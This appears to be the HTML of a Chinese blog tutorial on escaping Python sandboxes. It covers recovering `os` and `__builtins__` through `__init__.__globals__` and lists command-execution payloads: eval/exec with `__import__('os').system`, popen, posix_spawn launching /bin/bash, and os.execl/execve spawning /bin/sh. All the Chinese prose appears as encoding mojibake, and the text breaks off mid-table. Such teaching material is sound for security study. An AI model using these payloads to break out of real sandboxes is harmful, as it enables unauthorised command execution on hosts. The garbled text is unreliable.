<h4 id="init"><a href="#init" class="headerlink" title="__init__"></a><code>__init__</code></h4><p><code>__init__</code> æ˜¯ç±»çš„â€œæ„é€ å™¨æ–¹æ³•â€ï¼Œåœ¨<strong>ç±»å®ä¾‹åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨</strong>ï¼Œç”¨äºåˆå§‹åŒ–å®ä¾‹çš„å±æ€§ã€‚</p>
<p>å¯¹è±¡çš„ <code>__init__</code> æ–¹æ³•åˆ†ä¸º<strong>â€œé»˜è®¤çš„â€</strong>å’Œ<strong>â€œé‡è½½è¿‡çš„â€</strong>ä¸¤ç§æƒ…å†µï¼š</p>
<ul>
<li><p>å¦‚æœä½  <strong>æ²¡æœ‰</strong>åœ¨ç±»é‡Œå®šä¹‰ <code>__init__</code>ï¼ŒPython ä¼šè‡ªåŠ¨ä»å…¶<strong>çˆ¶ç±»ç»§æ‰¿ä¸€ä¸ªé»˜è®¤çš„ <code>__init__</code> æ–¹æ³•</strong>ã€‚è¿™æ˜¯ <strong>å†…ç½®çš„ object ç±»</strong> æä¾›çš„é»˜è®¤ <code>__init__</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ª C å®ç°çš„â€œslot wrapperâ€ï¼Œä¸æ˜¯çœŸæ­£çš„ Python å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>.__init__</span><br><span class="line">&lt;slot wrapper <span class="string">&#x27;__init__&#x27;</span> of <span class="string">&#x27;object&#x27;</span> objects&gt;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>å¦‚æœä½  <strong>å®šä¹‰äº†è‡ªå·±çš„ <code>__init__</code></strong> æ–¹æ³•ï¼Œåˆ™ä½ çœ‹åˆ°çš„å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ Python å‡½æ•°å¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;init from B&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(B.__init__)</span><br><span class="line"><span class="comment"># è¾“å‡º &lt;function B.__init__ at 0x...&gt;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>å…¶ä¸­é»˜è®¤çš„ <code>__init__</code> æ˜¯ C å®ç°çš„ slot wrapperï¼Œæ²¡æœ‰ <code>__globals__</code> å±æ€§ï¼›è€Œåªæœ‰<strong>Python å†™çš„å‡½æ•°</strong>æ‰æœ‰ <code>__globals__</code>ï¼Œæ‰èƒ½é€šè¿‡å®ƒæ¥æ‰¾åˆ°å¯¼å…¥çš„æ¨¡å—ã€‚</p>
<p>å› æ­¤åœ¨æ²™ç®±é€ƒé€¸ä¸­å¸¸å¸¸éœ€è¦å¯»æ‰¾ä¸€ä¸ªæ‹¥æœ‰é‡è½½ <code>__init__</code> çš„å¯¹è±¡ï¼Œç„¶åé€šè¿‡ <code>obj.__init__.__globals__</code> æ¥è·å¾—è¯¥å¯¹è±¡çš„æ‰€åœ¨æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ã€‚åœ¨è¿™ä¸ªå…¨å±€å…¨å±€å‘½åç©ºé—´ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾å›è¢«æ²™ç®±åˆ é™¤æ‰çš„ <code>__builtins__</code>ã€<code>os</code> ç­‰æ¨¡å—ã€‚</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>å®é™…ä¸Šåœ¨æ²™ç®±é€ƒé€¸ä¸­ï¼Œæˆ‘ä»¬ä¸ä¸€å®šè¦ç”¨ <code>__init__</code> å‡½æ•°çš„ <code>__globals__</code> å±æ€§æ¥è·å–æ‰€åœ¨æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ï¼Œå…¶ä»–å‡½æ•°ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p>
<ul>
<li><code>__del__</code>ï¼šä¸€ä¸ªç±»çš„ææ„å‡½æ•°ï¼Œå½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œå®ƒä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</li>
<li><code>__str__</code> &#x2F; <code>__repr__</code>ï¼šç”¨äºå®šä¹‰å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚<code>__str__</code> åœ¨ä½¿ç”¨ <code>str()</code> æˆ– <code>print()</code> æ—¶è°ƒç”¨ï¼Œ<code>__repr__</code> åœ¨ä½¿ç”¨ <code>repr()</code> æˆ–äº¤äº’å¼è§£é‡Šå™¨æ—¶è°ƒç”¨ã€‚å¦‚æœæœªå®šä¹‰ <code>__str__</code>ï¼Œåˆ™é»˜è®¤ä½¿ç”¨ <code>__repr__</code>ã€‚</li>
<li><code>__eq__</code> &#x2F; <code>__ne__</code> &#x2F; <code>__lt__</code> &#x2F; <code>__gt__</code> &#x2F; <code>__le__</code> &#x2F; <code>__ge__</code>ï¼šå®šä¹‰å¯¹è±¡ä¹‹é—´çš„æ¯”è¾ƒæ“ä½œï¼Œå¦‚ç­‰äºã€ä¸ç­‰äºã€å°äºã€å¤§äºã€å°äºç­‰äºã€å¤§äºç­‰äºã€‚</li>
<li><code>__add__</code> &#x2F; <code>__sub__</code> &#x2F; <code>__mul__</code> &#x2F; <code>__div__</code> &#x2F; <code>__mod__</code> &#x2F; <code>__pow__</code>ï¼šå®šä¹‰åŸºæœ¬æ•°å­¦è¿ç®—ç¬¦çš„è¡Œä¸ºï¼Œå¦‚åŠ ã€å‡ã€ä¹˜ã€é™¤ã€å–æ¨¡ã€å¹‚è¿ç®—ç­‰ã€‚</li>
<li><code>__getitem__</code> &#x2F; <code>__setitem__</code> &#x2F; <code>__delitem__</code>ï¼šå®šä¹‰å¯¹è±¡é€šè¿‡ç´¢å¼•è®¿é—®ã€èµ‹å€¼å’Œåˆ é™¤çš„è¡Œä¸ºï¼Œæ”¯æŒç±»ä¼¼åˆ—è¡¨ã€å­—å…¸çš„æ“ä½œã€‚</li>
<li><code>__iter__</code> &#x2F; <code>__next__</code>ï¼šå®šä¹‰å¯¹è±¡çš„è¿­ä»£è¡Œä¸ºï¼Œæ”¯æŒ <code>for</code> å¾ªç¯æˆ–æ‰‹åŠ¨è°ƒç”¨ <code>next()</code>ã€‚</li>
<li><code>__call__</code>ï¼šå…è®¸å®ä¾‹åƒå‡½æ•°ä¸€æ ·è¢«è°ƒç”¨ï¼Œå³æ”¯æŒ <code>obj()</code> è¿™æ ·çš„è¯­æ³•ã€‚</li>
<li><code>__getattr__</code> &#x2F; <code>__setattr__</code> &#x2F; <code>__delattr__</code>ï¼šç”¨äºæ‹¦æˆªå±æ€§çš„è®¿é—®ã€è®¾ç½®å’Œåˆ é™¤æ“ä½œï¼Œå¸¸ç”¨äºè‡ªå®šä¹‰å¯¹è±¡å±æ€§ç®¡ç†é€»è¾‘ã€‚</li>
</ul>

    </div>
  </div>

<h3 id="å±æ€§è·å–-è®¾ç½®"><a href="#å±æ€§è·å–-è®¾ç½®" class="headerlink" title="å±æ€§è·å– &#x2F; è®¾ç½®"></a>å±æ€§è·å– &#x2F; è®¾ç½®</h3><h4 id="getattribute-name"><a href="#getattribute-name" class="headerlink" title="__getattribute__(name)"></a><code>__getattribute__(name)</code></h4><p>å¯¹è±¡<strong>æ‰€æœ‰å±æ€§è®¿é—®</strong>æ—¶ï¼Œéƒ½ä¼šå…ˆè°ƒç”¨å®ƒï¼ˆæ— è®ºå±æ€§æ˜¯å¦å­˜åœ¨ï¼‰ï¼Œ<strong>ä¼˜å…ˆçº§</strong>é«˜äº <code>__getattr__</code>ã€‚</p>
<p>å¯ä»¥åœ¨æ²™ç®±é¢˜ä¸­é€šè¿‡è¦†å†™å®ƒï¼Œ<strong>æ‹¦æˆªæ‰€æœ‰å±æ€§è®¿é—®</strong>ï¼Œç”šè‡³è½¬å‘åˆ°çœŸå®å¯¹è±¡ã€‚</p>
<h4 id="getattr-name"><a href="#getattr-name" class="headerlink" title="__getattr__(name)"></a><code>__getattr__(name)</code></h4><p>å½“<strong>è®¿é—®ä¸å­˜åœ¨çš„å±æ€§</strong>æ—¶æ‰è°ƒç”¨å®ƒã€‚åœ¨å±æ€§è¢«åˆ æˆ–è¢«è¿‡æ»¤çš„ç¯å¢ƒé‡Œï¼Œå¯ä»¥åˆ©ç”¨å®ƒè¿”å›ä¸€ä¸ªä¼ªé€ å¯¹è±¡æˆ–è½¬å‘åˆ°çœŸå®å¯¹è±¡ã€‚</p>
<p>å¦å¤–è¿˜æœ‰ï¼š</p>
<ul>
<li><code>__setattr__(name, value)</code>ï¼š<strong>ä»»ä½•å±æ€§èµ‹å€¼</strong>æ—¶éƒ½ä¼šè°ƒç”¨å®ƒã€‚</li>
<li><code>__delattr__(name)</code>ï¼šåˆ é™¤å±æ€§æ—¶è°ƒç”¨ã€‚</li>
</ul>
<h4 id="getitem-key"><a href="#getitem-key" class="headerlink" title="__getitem__(key)"></a><code>__getitem__(key)</code></h4><p><code>obj[key]</code> è®¿é—®æ—¶è°ƒç”¨ï¼Œå¦å¤–è¿˜æœ‰ï¼š</p>
<ul>
<li><code>__setitem__(key, value)</code>ï¼š<code>obj[key] = value</code> æ—¶è°ƒç”¨ã€‚</li>
<li><code>__delitem__(self, key)</code>ï¼š<code>del obj[key]</code> æ—¶è°ƒç”¨ã€‚</li>
</ul>
<h4 id="dir"><a href="#dir" class="headerlink" title="__dir__()"></a><code>__dir__()</code></h4><p><code>dir(obj)</code> è°ƒç”¨æ—¶æ‰§è¡Œï¼Œè¿”å›å±æ€§åˆ—è¡¨ã€‚</p>
<h1 id="æ²™ç®±é€ƒé€¸ç›®æ ‡"><a href="#æ²™ç®±é€ƒé€¸ç›®æ ‡" class="headerlink" title="æ²™ç®±é€ƒé€¸ç›®æ ‡"></a>æ²™ç®±é€ƒé€¸ç›®æ ‡</h1><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><h3 id="builtin-æ¨¡å—"><a href="#builtin-æ¨¡å—" class="headerlink" title="builtin æ¨¡å—"></a>builtin æ¨¡å—</h3><table>
<thead>
<tr>
<th>æ–¹æ³•</th>
<th>å¤šè¡Œæ”¯æŒ</th>
<th>è¿”å›å€¼</th>
</tr>
</thead>
<tbody><tr>
<td><code>exec(code)</code></td>
<td>âœ…</td>
<td><code>None</code></td>
</tr>
<tr>
<td><code>eval(expr)</code></td>
<td>âŒ</td>
<td>è®¡ç®—ç»“æœ</td>
</tr>
<tr>
<td><code>eval(compile(code,&quot;exec&quot;))</code></td>
<td>âœ…</td>
<td><code>None</code></td>
</tr>
</tbody></table>
<h4 id="execï¼ˆæ‰§è¡Œ-Python-ä»£ç å­—ç¬¦ä¸²ï¼‰"><a href="#execï¼ˆæ‰§è¡Œ-Python-ä»£ç å­—ç¬¦ä¸²ï¼‰" class="headerlink" title="execï¼ˆæ‰§è¡Œ Python ä»£ç å­—ç¬¦ä¸²ï¼‰"></a><code>exec</code>ï¼ˆæ‰§è¡Œ Python ä»£ç å­—ç¬¦ä¸²ï¼‰</h4><p>æ”¯æŒå¤šè¡Œä»£ç ï¼Œæ‰§è¡Œç»“æœæ˜¯ <code>None</code>ï¼ˆæ— è¿”å›å€¼ï¼‰ï¼Œè¿è¡Œç¯å¢ƒé»˜è®¤æ˜¯å½“å‰å…¨å±€&#x2F;å±€éƒ¨ä½œç”¨åŸŸã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>ä¹Ÿå¯ä»¥é€šè¿‡ <code>builtins</code> æ¨¡å—é—´æ¥è°ƒç”¨ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>.__self__.<span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="evalï¼ˆæ±‚å€¼è¡¨è¾¾å¼ï¼‰"><a href="#evalï¼ˆæ±‚å€¼è¡¨è¾¾å¼ï¼‰" class="headerlink" title="evalï¼ˆæ±‚å€¼è¡¨è¾¾å¼ï¼‰"></a><code>eval</code>ï¼ˆæ±‚å€¼è¡¨è¾¾å¼ï¼‰</h4><p>åªèƒ½æ‰§è¡Œ<strong>å•ä¸ªè¡¨è¾¾å¼</strong>ï¼ˆä¸èƒ½ç›´æ¥å¤šè¡Œã€ä¸èƒ½ç›´æ¥èµ‹å€¼è¯­å¥ç­‰ï¼‰,è¿”å›è¡¨è¾¾å¼è®¡ç®—ç»“æœã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p><code>eval</code> æ— æ³•ç›´æ¥è¾¾åˆ°æ‰§è¡Œå¤šè¡Œä»£ç çš„æ•ˆæœï¼Œä½¿ç”¨ <code>compile</code> å‡½æ•°å¹¶ä¼ å…¥ <code>exec</code> æ¨¡å¼å°±èƒ½å¤Ÿå®ç°ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>Python å†…ç½®å‡½æ•° <code>compile(source, filename, mode)</code> ä¼šæŠŠ <strong>æºç å­—ç¬¦ä¸²</strong> ç¼–è¯‘æˆ <strong>å¯æ‰§è¡Œçš„ä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰</strong>ã€‚</p>
<ul>
<li><strong><code>source</code></strong> ï¼šè¦ç¼–è¯‘çš„ Python ä»£ç ï¼ˆå­—ç¬¦ä¸²ã€AST ç­‰ï¼‰</li>
<li><strong><code>filename</code></strong> ï¼šä»£ç æ¥æºåå­—ï¼ˆç»™è°ƒè¯•å™¨&#x2F;å¼‚å¸¸ä¿¡æ¯ç”¨ï¼Œéšä¾¿å†™ï¼Œæ¯”å¦‚ <code>&lt;string&gt;</code>ã€<code>&lt;payload&gt;</code>ï¼‰</li>
<li><strong><code>mode</code></strong> ï¼š<ul>
<li><code>&#39;exec&#39;</code> â†’ æ‰§è¡Œæ¨¡å¼ï¼Œå¯åŒ…å«å¤šè¡Œè¯­å¥ï¼ˆ<code>for</code>ã€<code>def</code>ã€<code>import</code> ç­‰ï¼‰</li>
<li><code>&#39;eval&#39;</code> â†’ è¡¨è¾¾å¼æ¨¡å¼ï¼Œåªå…è®¸å•ä¸ªè¡¨è¾¾å¼</li>
<li><code>&#39;single&#39;</code> â†’ å•è¡Œæ¨¡å¼ï¼Œäº¤äº’å¼æ‰§è¡Œï¼ˆä¼šå›æ˜¾ï¼‰</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="os-æ¨¡å—"><a href="#os-æ¨¡å—" class="headerlink" title="os æ¨¡å—"></a>os æ¨¡å—</h3><table>
<thead>
<tr>
<th>æ–¹æ³•</th>
<th>æ˜¯å¦èµ° Shell</th>
<th>æ˜¯å¦è¿”å›ç»“æœ</th>
<th>æ˜¯å¦æ›¿æ¢å½“å‰è¿›ç¨‹</th>
<th>æ˜¯å¦å¯ä¼ ç¯å¢ƒå˜é‡</th>
</tr>
</thead>
<tbody><tr>
<td><code>os.system</code></td>
<td>âœ…</td>
<td>âŒï¼ˆè¿”å›ç ï¼‰</td>
<td>âŒ</td>
<td>é—´æ¥ï¼ˆä¾èµ– shellï¼‰</td>
</tr>
<tr>
<td><code>os.popen</code></td>
<td>âœ…</td>
<td>âœ…ï¼ˆè¾“å‡ºï¼‰</td>
<td>âŒ</td>
<td>é—´æ¥ï¼ˆä¾èµ– shellï¼‰</td>
</tr>
<tr>
<td><code>posix_spawn</code></td>
<td>âŒ</td>
<td>âŒ</td>
<td>âŒ</td>
<td>âœ…</td>
</tr>
<tr>
<td><code>spawnv</code></td>
<td>âŒ</td>
<td>âŒ</td>
<td>âŒ</td>
<td>âœ…</td>
</tr>
<tr>
<td><code>exec*</code> ç³»åˆ—</td>
<td>âŒ&#x2F;PATH å¯é€‰</td>
<td>âŒ</td>
<td>âœ…</td>
<td>éƒ¨åˆ†æ”¯æŒï¼ˆå¸¦ e çš„ï¼‰</td>
</tr>
<tr>
<td><code>fork</code>+cmd</td>
<td>å¯é€‰</td>
<td>å¯é€‰</td>
<td>âŒ</td>
<td>å¯é€‰</td>
</tr>
</tbody></table>
<h4 id="system-popen-ç³»åˆ—ï¼ˆæœ€ç›´è§‚ï¼‰"><a href="#system-popen-ç³»åˆ—ï¼ˆæœ€ç›´è§‚ï¼‰" class="headerlink" title="system &#x2F; popen ç³»åˆ—ï¼ˆæœ€ç›´è§‚ï¼‰"></a><code>system</code> &#x2F; <code>popen</code> ç³»åˆ—ï¼ˆæœ€ç›´è§‚ï¼‰</h4><p>ç›´æ¥é€šè¿‡ shell æ‰§è¡Œå‘½ä»¤ï¼Œç»“æœè¿”å›ç æˆ–è¾“å‡ºå†…å®¹ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)                                <span class="comment"># æ‰§è¡Œå‘½ä»¤ï¼Œè¿”å› exit code</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)                  <span class="comment"># åŠ¨æ€å¯¼å…¥ç»•è¿‡</span></span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">&quot;ls&quot;</span>).read()                           <span class="comment"># æ‰§è¡Œå‘½ä»¤å¹¶è¯»å–è¾“å‡º</span></span><br></pre></td></tr></table></figure></div>

<p>âš ï¸ <code>system</code> ä¼šå¯åŠ¨ä¸€ä¸ª shellï¼ˆsh&#x2F;bashï¼‰ï¼Œ<code>popen</code> è¿˜èƒ½ç›´æ¥æ•è·è¾“å‡ºã€‚</p>
<h4 id="spawn-posix-spawn-ç³»åˆ—ï¼ˆç›´æ¥è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼‰"><a href="#spawn-posix-spawn-ç³»åˆ—ï¼ˆç›´æ¥è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼‰" class="headerlink" title="spawn &#x2F; posix_spawn ç³»åˆ—ï¼ˆç›´æ¥è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼‰"></a><code>spawn</code> &#x2F; <code>posix_spawn</code> ç³»åˆ—ï¼ˆç›´æ¥è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼‰</h4><p>ç›´æ¥æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä¼ å‚æ•°å’Œç¯å¢ƒå˜é‡ï¼Œä¾èµ– <code>execve</code>ã€‚ä¸èµ° shellï¼Œç›´æ¥è¿è¡ŒäºŒè¿›åˆ¶ã€‚å¸¸ç”¨äºä¸æƒ³ä¾èµ– shell è§£æçš„åœºæ™¯ï¼ˆç»•è¿‡æŸäº›å­—ç¬¦è¿‡æ»¤ï¼‰ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">os.posix_spawn(<span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>], os.environ)</span><br><span class="line">os.posix_spawn(<span class="string">&quot;/bin/bash&quot;</span>, [<span class="string">&quot;/bin/bash&quot;</span>], os.environ)</span><br><span class="line"></span><br><span class="line">os.spawnv(<span class="number">0</span>, <span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>])</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>posix_spawn</code> â†’ <strong>åªæœ‰ç±» Unix ç³»ç»Ÿ</strong>å¯ç”¨ï¼ŒWindows ä¼šç›´æ¥ <code>AttributeError</code>ã€‚</li>
<li><code>spawnv</code> â†’ Windows å’Œç±» Unix éƒ½èƒ½ç”¨ï¼Œä½†æ‰§è¡Œè¡Œä¸ºä¼šè·Ÿå¹³å°ç›¸å…³ã€‚</li>
</ul>
<h4 id="exec-ç³»åˆ—ï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹ï¼‰"><a href="#exec-ç³»åˆ—ï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹ï¼‰" class="headerlink" title="exec* ç³»åˆ—ï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹ï¼‰"></a><code>exec*</code> ç³»åˆ—ï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹ï¼‰</h4><p>ç›´æ¥æ›¿æ¢å½“å‰ Python è¿›ç¨‹ä¸ºç›®æ ‡ç¨‹åºï¼ˆæ‰§è¡Œå Python ä¸ä¼šè¿”å›ï¼‰ã€‚</p>
<table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>è·¯å¾„æ–¹å¼</th>
<th>ä¼ å‚æ–¹å¼</th>
<th>ç¯å¢ƒå˜é‡æŒ‡å®š</th>
<th>PATH æœç´¢</th>
</tr>
</thead>
<tbody><tr>
<td><code>execl</code></td>
<td>ç»å¯¹è·¯å¾„</td>
<td>åˆ†æ•£å‚æ•°</td>
<td>âŒ</td>
<td>âŒ</td>
</tr>
<tr>
<td><code>execle</code></td>
<td>ç»å¯¹è·¯å¾„</td>
<td>åˆ†æ•£å‚æ•°</td>
<td>âœ…</td>
<td>âŒ</td>
</tr>
<tr>
<td><code>execlp</code></td>
<td>ç¨‹åºå</td>
<td>åˆ†æ•£å‚æ•°</td>
<td>âŒ</td>
<td>âœ…</td>
</tr>
<tr>
<td><code>execlpe</code></td>
<td>ç¨‹åºå</td>
<td>åˆ†æ•£å‚æ•°</td>
<td>âœ…</td>
<td>âœ…</td>
</tr>
<tr>
<td><code>execv</code></td>
<td>ç»å¯¹è·¯å¾„</td>
<td>åˆ—è¡¨å‚æ•°</td>
<td>âŒ</td>
<td>âŒ</td>
</tr>
<tr>
<td><code>execve</code></td>
<td>ç»å¯¹è·¯å¾„</td>
<td>åˆ—è¡¨å‚æ•°</td>
<td>âœ…</td>
<td>âŒ</td>
</tr>
<tr>
<td><code>execvp</code></td>
<td>ç¨‹åºå</td>
<td>åˆ—è¡¨å‚æ•°</td>
<td>âŒ</td>
<td>âœ…</td>
</tr>
<tr>
<td><code>execvpe</code></td>
<td>ç¨‹åºå</td>
<td>åˆ—è¡¨å‚æ•°</td>
<td>âœ…</td>
<td>âœ…</td>
</tr>
</tbody></table>
<p>ä¾‹å­ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.execl(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>)                      <span class="comment"># æœ€ç®€å• exec</span></span><br><span class="line">os.execve(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;sh&#x27;</span>], os.environ)       <span class="comment"># åˆ—è¡¨ + ç¯å¢ƒ</span></span><br><span class="line">os.execlp(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>)                           <span class="comment"># æœç´¢ PATH</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execvpe(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;sh&#x27;</span>], <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br></pre></td></tr></table></figure></div>

<p>ç‰¹ç‚¹ï¼š</p>
<ul>
<li>è¿›ç¨‹æ›¿æ¢ï¼Œæ²¡æœ‰è¿”å›å€¼ï¼ˆå½“å‰ Python è¿›ç¨‹ç»ˆæ­¢ï¼‰ã€‚</li>
<li>é€‚åˆææƒåç›´æ¥åˆ‡ shellã€‚</li>
</ul>
<h4 id="fork-å‘½ä»¤æ‰§è¡Œï¼ˆå­è¿›ç¨‹è¿è¡Œï¼‰"><a href="#fork-å‘½ä»¤æ‰§è¡Œï¼ˆå­è¿›ç¨‹è¿è¡Œï¼‰" class="headerlink" title="fork + å‘½ä»¤æ‰§è¡Œï¼ˆå­è¿›ç¨‹è¿è¡Œï¼‰"></a><code>fork</code> + å‘½ä»¤æ‰§è¡Œï¼ˆå­è¿›ç¨‹è¿è¡Œï¼‰</h4><p>æ‰‹åŠ¨ fork å‡ºä¸€ä¸ªå­è¿›ç¨‹æ‰§è¡Œå‘½ä»¤ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).fork() == <span class="number">0</span>) <span class="keyword">and</span> <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<ul>
<li>çˆ¶è¿›ç¨‹ç»§ç»­è¿è¡Œï¼Œå­è¿›ç¨‹æ‰§è¡Œå‘½ä»¤ã€‚</li>
<li>å¸¸é…åˆ exec ç³»åˆ—å®ç°å¹¶è¡Œã€‚</li>
</ul>
<h3 id="subprocess-æ¨¡å—"><a href="#subprocess-æ¨¡å—" class="headerlink" title="subprocess æ¨¡å—"></a>subprocess æ¨¡å—</h3><table>
<thead>
<tr>
<th>æ–¹æ³•</th>
<th>Python ç‰ˆæœ¬</th>
<th>è¿”å›å€¼ç±»å‹ &#x2F; å†…å®¹</th>
<th>å¤±è´¥å¤„ç†</th>
<th>è·å–è¾“å‡ºæ–¹å¼</th>
<th>æ˜¯å¦èµ° shell</th>
</tr>
</thead>
<tbody><tr>
<td><code>Popen</code></td>
<td>py2 &#x2F; py3</td>
<td><code>Popen</code> å¯¹è±¡</td>
<td>æ— </td>
<td>âŒï¼ˆéœ€ <code>stdout=PIPE</code> å <code>.stdout.read()</code>ï¼‰</td>
<td>é»˜è®¤å¦ï¼Œå¯é€‰</td>
</tr>
<tr>
<td><code>call</code></td>
<td>py2 &#x2F; py3</td>
<td><code>int</code>ï¼ˆexit codeï¼‰</td>
<td>æ— </td>
<td>âŒ</td>
<td>é»˜è®¤å¦ï¼Œå¯é€‰</td>
</tr>
<tr>
<td><code>check_call</code></td>
<td>py2 &#x2F; py3</td>
<td><code>int</code>ï¼ˆexit codeï¼‰</td>
<td>é”™è¯¯æŠ›å¼‚å¸¸</td>
<td>âŒ</td>
<td>é»˜è®¤å¦ï¼Œå¯é€‰</td>
</tr>
<tr>
<td><code>check_output</code></td>
<td>py2 &#x2F; py3</td>
<td><code>bytes</code>ï¼ˆå‘½ä»¤è¾“å‡ºï¼‰</td>
<td>é”™è¯¯æŠ›å¼‚å¸¸</td>
<td>âœ…ï¼ˆç›´æ¥è¿”å› stdoutï¼‰</td>
<td>é»˜è®¤å¦ï¼Œå¯é€‰</td>
</tr>
<tr>
<td><code>run</code></td>
<td>py3</td>
<td><code>CompletedProcess</code> å¯¹è±¡</td>
<td>å¯é€‰æŠ›å¼‚å¸¸</td>
<td>âœ…ï¼ˆéœ€ <code>capture_output=True</code> æˆ– <code>stdout=PIPE</code>ï¼‰</td>
<td>é»˜è®¤å¦ï¼Œå¯é€‰</td>
</tr>
<tr>
<td><code>getoutput</code></td>
<td>py3</td>
<td><code>str</code>ï¼ˆå‘½ä»¤è¾“å‡ºï¼‰</td>
<td>æ— </td>
